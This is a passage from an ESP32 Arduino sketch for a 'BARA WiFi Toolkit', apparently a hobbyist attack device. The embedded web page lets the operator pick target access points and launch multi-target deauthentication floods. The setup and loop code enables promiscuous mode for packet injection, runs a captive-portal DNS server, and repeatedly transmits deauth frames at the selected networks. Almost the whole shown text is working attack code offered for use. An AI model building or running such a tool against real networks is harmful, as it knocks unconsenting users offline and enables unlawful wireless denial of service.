                actionCell.appendChild(btn);
            });
        }
        
        function getSignalBars(rssi) {
            let bars = '';
            const strength = rssi > -50 ? 4 : rssi > -60 ? 3 : rssi > -70 ? 2 : 1;
            for (let i = 1; i <= 4; i++) {
                const height = i * 8;
                const opacity = i <= strength ? 1 : 0.3;
                bars += `<div class="signal-bar" style="height:${height}px; opacity:${opacity}"></div>`;
            }
            return bars;
        }
        
        function getEncryptionBadge(enc) {
            const types = {
                0: { label: 'OPEN', class: 'enc-open' },
                1: { label: 'WEP', class: 'enc-wep' },
                2: { label: 'WPA', class: 'enc-wpa' },
                3: { label: 'WPA2', class: 'enc-wpa2' },
                4: { label: 'WPA2', class: 'enc-wpa2' }
            };
            const type = types[enc] || { label: 'UNKNOWN', class: 'enc-wpa' };
            return `<span class="enc-badge ${type.class}">${type.label}</span>`;
        }
        
        function selectTarget(network) {
            document.getElementById('targetBssid').value = network.bssid;
            document.getElementById('targetChannel').value = network.channel;
            document.getElementById('deauthPanel').style.display = 'block';
            addLog(`Selected target: ${network.bssid} (${network.ssid || 'HIDDEN'}) on channel ${network.channel}`, 'warning');
            playTone(600, 0.1);
        }
        
        // ==================== DEAUTH ATTACK MANAGEMENT ====================
        let activeTargets = [];
        
        function toggleDeauthPanel() {
            const panel = document.getElementById('deauthPanel');
            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
            playTone(500, 0.05);
        }
        
        async function addDeauthTarget() {
            const bssid = document.getElementById('targetBssid').value.trim().toUpperCase();
            const channel = parseInt(document.getElementById('targetChannel').value);
            const interval = parseInt(document.getElementById('attackInterval').value);
            
            // Validate BSSID
            if (!bssid || !/^[0-9A-F]{2}(:[0-9A-F]{2}){5}$/.test(bssid)) {
                alert('⚠️ Invalid BSSID format! Use AA:BB:CC:DD:EE:FF');
                playErrorSound();
                return;
            }
            
            // Validate Channel
            if (!channel || channel < 1 || channel > 13) {
                alert('⚠️ Invalid channel! Must be 1-13');
                playErrorSound();
                return;
            }
            
            // Check if target already exists
            if (activeTargets.find(t => t.bssid === bssid)) {
                addLog(`Target ${bssid} already in list`, 'warning');
                return;
            }
            
            try {
                const response = await fetch(`/addtarget?bssid=${encodeURIComponent(bssid)}&channel=${channel}&interval=${interval}`);
                const result = await response.text();
                
                activeTargets.push({ bssid, channel, packets: 0, active: false });
                renderTargets();
                addLog(result, 'success');
                playSuccessSound();
                
                // Clear inputs
                document.getElementById('targetBssid').value = '';
                document.getElementById('targetChannel').value = '';
            } catch (error) {
                addLog('Failed to add target: ' + error.message, 'error');
                playErrorSound();
            }
        }
        
        async function startAllAttacks() {
            if (activeTargets.length === 0) {
                alert('⚠️ No targets configured!');
                playErrorSound();
                return;
            }
            
            try {
                const response = await fetch('/startdeauth');
                const result = await response.text();
                updateStatus('🔥 DEAUTH ATTACKS ACTIVE — MULTIPLE TARGETS', 'status-attacking');
                addLog(result, 'attack');
                activeTargets.forEach(t => t.active = true);
                renderTargets();
                playAttackSound();
            } catch (error) {
                addLog('Failed to start attacks: ' + error.message, 'error');
                playErrorSound();
            }
        }
        
        async function stopAllAttacks() {
            try {
                const response = await fetch('/stopdeauth');
                const result = await response.text();
                updateStatus('✅ ALL ATTACKS STOPPED', 'status-idle');
                addLog(result, 'success');
                activeTargets.forEach(t => t.active = false);
                renderTargets();
                playSuccessSound();
            } catch (error) {
                addLog('Failed to stop attacks: ' + error.message, 'error');
            }
        }
        
        async function removeTarget(bssid) {
            try {
                const response = await fetch(`/removetarget?bssid=${encodeURIComponent(bssid)}`);
                const result = await response.text();
                activeTargets = activeTargets.filter(t => t.bssid !== bssid);
                renderTargets();
                addLog(result, 'info');
                playTone(400, 0.1);
            } catch (error) {
                addLog('Failed to remove target: ' + error.message, 'error');
            }
        }
        
        function renderTargets() {
            const listEl = document.getElementById('targetList');
            
            if (activeTargets.length === 0) {
                listEl.innerHTML = '<div style="text-align:center; color:#666;">No active targets</div>';
                return;
            }
            
            listEl.innerHTML = activeTargets.map(target => `
                <div class="target-item">
                    <div class="target-info">
                        <div class="target-bssid">${target.bssid}</div>
                        <div class="target-stats">
                            Channel: ${target.channel} | 
                            Packets: <span id="pkt-${target.bssid.replace(/:/g, '')}">${target.packets}</span> | 
                            Status: <span style="color: ${target.active ? '#ff4444' : '#888'}">${target.active ? '🔥 ATTACKING' : '⏸ PAUSED'}</span>
                        </div>
                    </div>
                    <button class="btn btn-stop" style="padding: 8px 16px;" onclick="removeTarget('${target.bssid}')">❌</button>
                </div>
            `).join('');
        }
        
        // ==================== METRICS UPDATE ====================
        async function updateMetrics() {
            try {
                const response = await fetch('/metrics');
                const data = await response.json();
                
                document.getElementById('uptime').textContent = formatUptime(data.uptime);
                document.getElementById('freeHeap').textContent = Math.floor(data.freeHeap / 1024) + ' KB';
                document.getElementById('totalScans').textContent = data.totalScans;
                document.getElementById('totalPackets').textContent = data.totalDeauthPackets.toLocaleString();
                
                // Update target packet counts
                if (data.targets) {
                    data.targets.forEach(target => {
                        const el = document.getElementById('pkt-' + target.bssid.replace(/:/g, ''));
                        if (el) el.textContent = target.packets.toLocaleString();
                    });
                }
            } catch (error) {
                // Silent fail for metrics
            }
        }
        
        function formatUptime(seconds) {
            const h = Math.floor(seconds / 3600);
            const m = Math.floor((seconds % 3600) / 60);
            const s = seconds % 60;
            if (h > 0) return `${h}h ${m}m`;
            if (m > 0) return `${m}m ${s}s`;
            return `${s}s`;
        }
        
        // ==================== INITIALIZATION ====================
        window.addEventListener('load', () => {
            createMatrixRain();
            addLog('🩸 BARA TOOLKIT v3.0 INITIALIZED', 'success');
            addLog('System ready for WiFi penetration testing', 'info');
            addLog('Developed by Ahmed Nour Ahmed | Qena, Egypt', 'info');
            updateStatus('✅ HOTSPOT ACTIVE — CONNECT TO "BARA_HACKING_PORTAL"', 'status-idle');
            playSuccessSound();
            
            // Start periodic updates
            setInterval(updateMetrics, 2000);
            setInterval(() => {
                if (activeTargets.some(t => t.active)) {
                    const msgs = [
                        '⚡ Packets flooding target network...',
                        '🔥 Deauth frames transmitted successfully',
                        '💀 Target network disruption in progress',
                        '🩸 Attack vector maintaining optimal rate'
                    ];
                    if (Math.random() > 0.7) {
                        addLog(msgs[Math.floor(Math.random() * msgs.length)], 'attack');
                    }
                }
            }, 5000);
        });
    </script>
</body>
</html>
)rawliteral";

// ==================== 🧪 SYSTEM INITIALIZATION ====================
void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("\n\n");
    Serial.println("========================================");
    Serial.println("🩸 BARA WIFI TOOLKIT v3.0 🩸");
    Serial.println("========================================");
    Serial.println("Developed by: Ahmed Nour Ahmed");
    Serial.println("Location: Qena, Egypt");
    Serial.println("========================================\n");
    
    // Initialize metrics
    metrics.uptime = 0;
    metrics.totalScans = 0;
    metrics.totalDeauthPackets = 0;
    
    // Initialize deauth targets
    for (int i = 0; i < MAX_DEAUTH_TARGETS; i++) {
        deauthTargets[i].bssid = "";
        deauthTargets[i].active = false;
        deauthTargets[i].packetCount = 0;
    }
    
    // Configure WiFi for AP mode with promiscuous capabilities
    WiFi.mode(WIFI_AP);
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_AP);
    
    // Start Access Point
    WiFi.softAP(AP_SSID, AP_PASS);
    WiFi.softAPConfig(
        IPAddress(192, 168, 4, 1),
        IPAddress(192, 168, 4, 1),
        IPAddress(255, 255, 255, 0)
    );
    
    IPAddress IP = WiFi.softAPIP();
    Serial.print("🔥 Access Point Started\n");
    Serial.print("   SSID: ");
    Serial.println(AP_SSID);
    Serial.print("   IP Address: ");
    Serial.println(IP);
    Serial.print("   URL: http://");
    Serial.println(IP);
    
    // Enable promiscuous mode for packet injection
    esp_wifi_set_promiscuous(true);
    
    // Start DNS server for captive portal
    dnsServer.start(53, "*", IP);
    Serial.println("🌐 DNS Server Started (Captive Portal)");
    
    // Initialize web server
    setupWebInterface();
    Serial.println("🌐 Web Server Started on port 80");
    
    Serial.println("\n========================================");
    Serial.println("✅ BARA IS ONLINE AND READY");
    Serial.println("========================================\n");
    
    addLog("System initialized successfully");
}

// ==================== 🔁 MAIN EXECUTION LOOP ====================
void loop() {
    // Process DNS requests for captive portal
    dnsServer.processNextRequest();
    
    // Execute deauth attacks on active targets
    if (deauthGlobalActive) {
        unsigned long currentTime = millis();
        
        for (int i = 0; i < MAX_DEAUTH_TARGETS; i++) {
            if (deauthTargets[i].active && 
                (currentTime - deauthTargets[i].lastSent >= globalDeauthInterval)) {
                
                sendDeauthFrame(deauthTargets[i].mac, deauthTargets[i].channel);
                deauthTargets[i].packetCount++;
                deauthTargets[i].lastSent = currentTime;
                metrics.totalDeauthPackets++;
            }
        }
    }
    
    // Update system metrics periodically
    if (millis() - lastStatsUpdate > 30000) {
        metrics.uptime = millis() / 1000;
        metrics.freeHeap = ESP.getFreeHeap();
        metrics.cpuFreq = ESP.getCpuFreqMHz();
        lastStatsUpdate = millis();
    }
    
    // Yield to system tasks
    yield();
    delay(1);
}
